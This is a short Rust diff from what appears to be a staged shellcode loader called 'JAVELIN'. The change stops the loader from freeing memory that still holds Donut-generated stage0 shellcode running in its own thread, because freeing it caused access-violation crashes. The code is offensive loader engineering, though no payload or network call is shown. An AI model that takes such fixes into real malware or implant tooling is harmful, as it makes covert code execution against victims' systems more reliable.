@@ -51,10 +51,12 @@ pub fn load_stage3() -> Result<(), Box<dyn Error>> {
         stage0_entry();
     }
 
-    #[cfg(feature = "dev")]
-    println!("[JAVELIN] Cleaning up memory");
-
-    cleanup_memory(&region);
+    // Do NOT cleanup/free `region` here. The stage0 shellcode was launched with
+    // Donut's -t flag, meaning stage0_lite runs in its own thread that still
+    // executes code from `region`. Freeing it while stage0 is running causes
+    // STATUS_ACCESS_VIOLATION (0xC0000005) in that thread.
+    // Leak the memory intentionally; the OS reclaims it when the process exits.
+    std::mem::forget(region);
 
     #[cfg(feature = "dev")]
     println!("[JAVELIN] Stage0-Lite execution complete");
